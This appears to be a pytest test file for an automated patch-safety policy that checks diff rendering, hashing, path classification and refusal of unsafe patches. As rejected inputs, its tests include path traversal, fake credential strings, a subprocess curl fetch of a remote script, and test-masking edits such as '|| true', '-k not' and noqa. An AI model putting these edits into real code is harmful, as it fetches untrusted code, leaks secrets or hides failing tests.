"""Tests for patch identity, diff rendering, and the patch-safety policy.

Every assertion here is against a real path or a real diff string. No test asserts a
constant alone.
"""

from __future__ import annotations

import hashlib
import subprocess
import sys
from pathlib import Path

import pytest

from openmedic.domain.errors import PolicyViolationError
from openmedic.remediation.patches import (
    MAX_CHANGED_LINES,
    FilePatch,
    PatchProposal,
    apply_patch_proposal,
    evaluate_patch_safety,
    is_ci_config_path,
    is_dependency_manifest_path,
    is_lockfile_path,
    is_sensitive_path,
    is_test_path,
    normalize_relative_path,
    render_unified_diff,
)


def _proposal(*files: FilePatch, summary: str = "Declare a dependency") -> PatchProposal:
    """Return a proposal over ``files`` with a fixed summary and rationale."""
    return PatchProposal(
        files=files,
        summary=summary,
        rationale="The evidence names exactly one missing module and no near-match.",
    )


class TestUnifiedDiff:
    """The rendered diff is deterministic, reversible, and honestly hashed."""

    def test_rendering_is_deterministic(self) -> None:
        file_patch = FilePatch("requirements.txt", "flask\n", "flask\npyyaml\n")
        first = file_patch.unified_diff
        second = FilePatch("requirements.txt", "flask\n", "flask\npyyaml\n").unified_diff
        assert first == second
        assert first.startswith("--- a/requirements.txt\n")
        assert "+++ b/requirements.txt\n" in first
        assert "@@ -1 +1,2 @@" in first
        assert "+pyyaml" in first.splitlines()

    def test_diff_uses_forward_slash_paths_from_both_sides(self) -> None:
        rendered = render_unified_diff("src/app.py", "value = 1\n", "value = 2\n")
        # A Windows-style separator would make the diff unapplicable on CI.
        assert "\\" not in rendered
        assert "--- a/src/app.py" in rendered
        assert "+++ b/src/app.py" in rendered
        assert "-value = 1" in rendered.splitlines()
        assert "+value = 2" in rendered.splitlines()

    def test_no_change_means_no_diff_and_no_hash(self) -> None:
        file_patch = FilePatch("src/app.py", "value = 1\n", "value = 1\n")
        assert file_patch.unified_diff == ""
        assert file_patch.patch_hash is None

    def test_patch_hash_is_a_real_sha256_of_the_exact_diff(self) -> None:
        file_patch = FilePatch("requirements.txt", "flask\n", "flask\npyyaml\n")
        expected = hashlib.sha256(file_patch.unified_diff.encode("utf-8")).hexdigest()
        assert file_patch.patch_hash == expected
        assert file_patch.patch_hash != hashlib.sha256(b"nothing like the diff").hexdigest()

    def test_hash_changes_when_the_patch_changes(self) -> None:
        first = FilePatch("requirements.txt", "flask\n", "flask\npyyaml\n")
        second = FilePatch("requirements.txt", "flask\n", "flask\nrequests\n")
        assert first.patch_hash != second.patch_hash

    @pytest.mark.parametrize(
        ("before", "after"),
        [
            ("", "pyyaml\n"),
            ("flask", "flask\npyyaml\n"),
            ("flask\n\n", "flask\npyyaml\n\n"),
        ],
    )
    def test_diff_survives_missing_trailing_newlines(self, before: str, after: str) -> None:
        rendered = render_unified_diff("requirements.txt", before, after)
        assert rendered
        assert rendered == rendered.strip()

    def test_multi_file_proposal_concatenates_every_header(self) -> None:
        proposal = _proposal(
            FilePatch("requirements.txt", "flask\n", "flask\npyyaml\n"),
            FilePatch("src/app.py", "import flask\n", "import flask\nimport yaml\n"),
        )
        rendered = proposal.unified_diff
        assert rendered.count("--- a/") == 2
        assert "requirements.txt" in rendered
        assert "src/app.py" in rendered
        assert rendered.index("requirements.txt") < rendered.index("src/app.py")


class TestPatchProposalQueries:
    """Proposal queries are path-aware and honest about no-ops."""

    def test_touches_file_compares_normalised_paths(self) -> None:
        proposal = _proposal(FilePatch("requirements.txt", "flask\n", "flask\npyyaml\n"))
        assert proposal.touches_file("requirements.txt")
        assert proposal.touches_file("./requirements.txt")
        assert not proposal.touches_file("pyproject.toml")

    def test_is_noop_detects_a_proposal_that_changes_nothing(self) -> None:
        assert _proposal(FilePatch("requirements.txt", "flask\n", "flask\n")).is_noop()
        assert not _proposal(FilePatch("requirements.txt", "flask\n", "pyyaml\n")).is_noop()

    def test_single_file_proposal_matches_its_file_patch_identity(self) -> None:
        file_patch = FilePatch("requirements.txt", "flask\n", "flask\npyyaml\n")
        proposal = _proposal(file_patch)
        assert proposal.unified_diff == file_patch.unified_diff
        assert proposal.patch_hash() == file_patch.patch_hash


class TestApplyPatchProposal:
    """Application writes literal text, into the worktree only, and never executes."""

    def test_apply_round_trips_into_a_disposable_worktree(self, tmp_path: Path) -> None:
        source = tmp_path / "repo"
        worktree = tmp_path / "worktree"
        source.mkdir()
        worktree.mkdir()
        (source / "requirements.txt").write_text("flask\n", encoding="utf-8")
        (worktree / "requirements.txt").write_text("flask\n", encoding="utf-8")
        before = FilePatch("requirements.txt", "flask\n", "flask\npyyaml\n")

        written = apply_patch_proposal(_proposal(before), worktree=worktree)

        assert [path.relative_to(worktree).as_posix() for path in written] == ["requirements.txt"]
        applied = (worktree / "requirements.txt").read_text(encoding="utf-8")
        assert applied == before.after
        assert (source / "requirements.txt").read_text(encoding="utf-8") == "flask\n"

        residual = FilePatch("requirements.txt", before.after, applied)
        assert residual.unified_diff == ""
        assert residual.patch_hash is None

    def test_apply_creates_missing_directories_for_a_new_file(self, tmp_path: Path) -> None:
        worktree = tmp_path / "worktree"
        worktree.mkdir()
        created = FilePatch("src/pkg/module.py", "", "VALUE = 1\n")
        written = apply_patch_proposal(_proposal(created), worktree=worktree)
        assert (worktree / "src" / "pkg" / "module.py").read_text(encoding="utf-8") == (
            "VALUE = 1\n"
        )
        assert written == [worktree / "src" / "pkg" / "module.py"]

    def test_apply_refuses_a_path_that_escapes_the_worktree(self, tmp_path: Path) -> None:
        worktree = tmp_path / "worktree"
        worktree.mkdir()
        escaping = _proposal(
            FilePatch("../outside.txt", "", "overwritten\n"),
        )
        with pytest.raises(PolicyViolationError) as excinfo:
            apply_patch_proposal(escaping, worktree=worktree)
        assert "outside.txt" in str(excinfo.value)
        assert not (tmp_path / "outside.txt").exists()

    def test_apply_refuses_an_absolute_path(self, tmp_path: Path) -> None:
        worktree = tmp_path / "worktree"
        worktree.mkdir()
        absolute = _proposal(FilePatch("/etc/passwd", "root\n", "root\nx\n"))
        with pytest.raises(PolicyViolationError):
            apply_patch_proposal(absolute, worktree=worktree)

    def test_apply_refuses_a_secret_bearing_path(self, tmp_path: Path) -> None:
        worktree = tmp_path / "worktree"
        worktree.mkdir()
        env_patch = FilePatch(".env", "", "AWS_SECRET_ACCESS_KEY=AKIAABCDEFGHIJKLMNOP\n")
        with pytest.raises(PolicyViolationError):
            apply_patch_proposal(_proposal(env_patch), worktree=worktree)

    def test_apply_refuses_a_stale_patch(self, tmp_path: Path) -> None:
        worktree = tmp_path / "worktree"
        worktree.mkdir()
        (worktree / "requirements.txt").write_text("flask\nrequests\n", encoding="utf-8")
        stale = FilePatch("requirements.txt", "flask\n", "flask\npyyaml\n")
        with pytest.raises(PolicyViolationError) as excinfo:
            apply_patch_proposal(_proposal(stale), worktree=worktree)
        assert "stale" in str(excinfo.value)
        assert (worktree / "requirements.txt").read_text(encoding="utf-8") == ("flask\nrequests\n")

    def test_apply_refuses_an_unsafe_patch_before_writing(self, tmp_path: Path) -> None:
        worktree = tmp_path / "worktree"
        worktree.mkdir()
        (worktree / "requirements.txt").write_text("flask\n", encoding="utf-8")
        unsafe = FilePatch("requirements.txt", "flask\n", "flask  # noqa\n")
        with pytest.raises(PolicyViolationError):
            apply_patch_proposal(_proposal(unsafe), worktree=worktree)
        assert (worktree / "requirements.txt").read_text(encoding="utf-8") == "flask\n"

    def test_apply_never_invokes_a_subprocess(self, tmp_path: Path, monkeypatch) -> None:
        def _explode(*args: object, **kwargs: object) -> None:
            msg = "apply_patch_proposal must not execute anything"
            raise AssertionError(msg)

        monkeypatch.setattr(subprocess, "run", _explode)
        monkeypatch.setattr(subprocess, "Popen", _explode)
        monkeypatch.setattr(subprocess, "check_output", _explode)
        worktree = tmp_path / "worktree"
        worktree.mkdir()
        apply_patch_proposal(
            _proposal(FilePatch("requirements.txt", "flask\n", "flask\npyyaml\n")),
            worktree=worktree,
        )
        assert (worktree / "requirements.txt").read_text(encoding="utf-8") == ("flask\npyyaml\n")
        assert sys.executable


class TestEvaluatePatchSafety:
    """The safety policy rejects exactly the changes SECURITY.md forbids."""

    def test_a_manifest_pin_is_safe(self) -> None:
        reasons = evaluate_patch_safety(
            _proposal(FilePatch("requirements.txt", "flask\n", "flask\npyyaml\n"))
        )
        assert reasons == []

    def test_a_single_identifier_fix_in_a_source_file_is_safe(self) -> None:
        reasons = evaluate_patch_safety(
            _proposal(
                FilePatch("src/app.py", "import nulid\n", "import ulid\n"),
                summary="Correct a misspelled import",
            )
        )
        assert reasons == []

    def test_a_declaration_in_pyproject_is_safe(self) -> None:
        pyproject = '[project]\nname = "demo"\ndependencies = [\n    "flask",\n]\n'
        patched = pyproject.replace('    "flask",\n', '    "flask",\n    "pyyaml",\n')
        reasons = evaluate_patch_safety(_proposal(FilePatch("pyproject.toml", pyproject, patched)))
        assert reasons == []

    def test_deleting_a_test_file_is_reported(self) -> None:
        reasons = evaluate_patch_safety(
            _proposal(FilePatch("tests/test_api.py", "def test_it():\n    assert True\n", ""))
        )
        assert reasons
        assert any("deletes the entire contents of tests/test_api.py" in r for r in reasons)

    def test_removing_an_assertion_is_reported(self) -> None:
        reasons = evaluate_patch_safety(
            _proposal(
                FilePatch(
                    "src/app.py",
                    "def check(value):\n    assert value > 0\n    return value\n",
                    "def check(value):\n    return value\n",
                )
            )
        )
        assert any("removes an assertion" in r for r in reasons)

    def test_adding_a_noqa_is_reported(self) -> None:
        reasons = evaluate_patch_safety(
            _proposal(
                FilePatch(
                    "src/app.py",
                    "import requests\n",
                    "import requests  # noqa: F401\n",
                )
            )
        )
        assert reasons
        assert any("noqa" in r for r in reasons)

    def test_masking_a_failing_command_is_reported(self) -> None:
        reasons = evaluate_patch_safety(
            _proposal(
                FilePatch(
                    ".github/workflows/ci.yml",
                    "    - run: pytest\n",
                    "    - run: pytest || true\n",
                )
            )
        )
        assert any("exit-code mask" in r for r in reasons)

    def test_deselecting_tests_with_k_not_is_reported(self) -> None:
        reasons = evaluate_patch_safety(
            _proposal(
                FilePatch("tox.ini", "commands = pytest\n", 'commands = pytest -k "not slow"\n')
            )
        )
        assert any("pytest deselector" in r for r in reasons)

    def test_emptying_a_file_is_reported(self) -> None:
        reasons = evaluate_patch_safety(_proposal(FilePatch("src/app.py", "VALUE = 1\n", "")))
        assert any("deletes the entire contents of src/app.py" in r for r in reasons)

    def test_truncating_a_test_file_is_reported(self) -> None:
        before = "".join(f"def test_{index}():\n    assert True\n" for index in range(10))
        reasons = evaluate_patch_safety(
            _proposal(FilePatch("tests/test_api.py", before, "def test_0():\n    assert True\n"))
        )
        assert reasons
        assert any("truncates the test file" in r for r in reasons)

    def test_introducing_secret_material_is_reported(self) -> None:
        reasons = evaluate_patch_safety(
            _proposal(
                FilePatch(
                    "src/settings.py",
                    "DEBUG = False\n",
                    "DEBUG = False\nGITHUB_TOKEN = github_pat_11ABCDE000000000000000000000\n",
                )
            )
        )
        assert any("secret-like material" in r for r in reasons)

    def test_introducing_command_execution_is_reported(self) -> None:
        reasons = evaluate_patch_safety(
            _proposal(
                FilePatch(
                    "src/deploy.py",
                    "MODE = 'ci'\n",
                    "MODE = 'ci'\n"
                    "import subprocess\n"
                    "subprocess.run(['curl', 'http://example.invalid/p.sh'])\n",
                )
            )
        )
        assert any("command execution" in r for r in reasons)

    def test_touching_git_internals_is_reported(self) -> None:
        reasons = evaluate_patch_safety(
            _proposal(FilePatch(".git/hooks/pre-commit", "#!/bin/sh\n", "#!/bin/sh\nexit 0\n"))
        )
        assert any("VCS-internal" in r for r in reasons)

    def test_an_oversized_rewrite_is_reported(self) -> None:
        before = "".join(f"line{index} = {index}\n" for index in range(400))
        after = "".join(f"line{index} = {index + 1}\n" for index in range(400))
        reasons = evaluate_patch_safety(_proposal(FilePatch("src/big.py", before, after)))
        assert any(f"{MAX_CHANGED_LINES}-line bound" in r for r in reasons)

    def test_an_empty_proposal_is_reported(self) -> None:
        assert evaluate_patch_safety(PatchProposal(files=(), summary="s", rationale="r"))


class TestPathClassification:
    """Path predicates decide which policies apply."""

    @pytest.mark.parametrize(
        ("path", "expected"),
        [
            ("tests/test_api.py", True),
            ("test_api.py", True),
            ("src/tests/helpers.py", True),
            ("tests/fixtures/data.json", True),
            ("src/openmedic/remediation/patches.py", False),
            ("requirements.txt", False),
        ],
    )
    def test_is_test_path(self, path: str, expected: bool) -> None:
        assert is_test_path(path) is expected

    @pytest.mark.parametrize(
        ("path", "expected"),
        [
            (".github/workflows/ci.yml", True),
            (".gitlab-ci.yml", True),
            ("Jenkinsfile", True),
            ("src/openmedic/api/app.py", False),
            ("requirements.txt", False),
        ],
    )
    def test_is_ci_config_path(self, path: str, expected: bool) -> None:
        assert is_ci_config_path(path) is expected

    @pytest.mark.parametrize(
        ("path", "manifest"),
        [
            ("requirements.txt", True),
            ("requirements-dev.txt", True),
            ("requirements/base.txt", True),
            ("pyproject.toml", True),
            ("uv.lock", False),
            ("poetry.lock", False),
            ("package-lock.json", False),
            ("src/openmedic/remediation/patches.py", False),
        ],
    )
    def test_dependency_manifest_classification(self, path: str, manifest: bool) -> None:
        assert is_dependency_manifest_path(path) is manifest

    @pytest.mark.parametrize(
        ("path", "lockfile"),
        [
            ("uv.lock", True),
            ("poetry.lock", True),
            ("package-lock.json", True),
            ("requirements.txt", False),
            ("requirements/base.txt", False),
            ("pyproject.toml", False),
            ("src/openmedic/remediation/patches.py", False),
        ],
    )
    def test_lockfile_classification(self, path: str, lockfile: bool) -> None:
        assert is_lockfile_path(path) is lockfile

    @pytest.mark.parametrize(
        ("path", "expected"),
        [
            (".env", True),
            (".env.production", True),
            ("secrets/tls.pem", True),
            ("src/openmedic/remediation/patches.py", False),
        ],
    )
    def test_is_sensitive_path(self, path: str, expected: bool) -> None:
        assert is_sensitive_path(path) is expected

    @pytest.mark.parametrize(
        ("path", "expected"),
        [
            ("src/app.py", "src/app.py"),
            ("./src/app.py", "src/app.py"),
            ("src\\app.py", "src/app.py"),
            ("/etc/passwd", None),
            ("../outside.txt", None),
            ("", None),
            ("~/secrets", None),
        ],
    )
    def test_normalize_relative_path(self, path: str, expected: str | None) -> None:
        assert normalize_relative_path(path) == expected
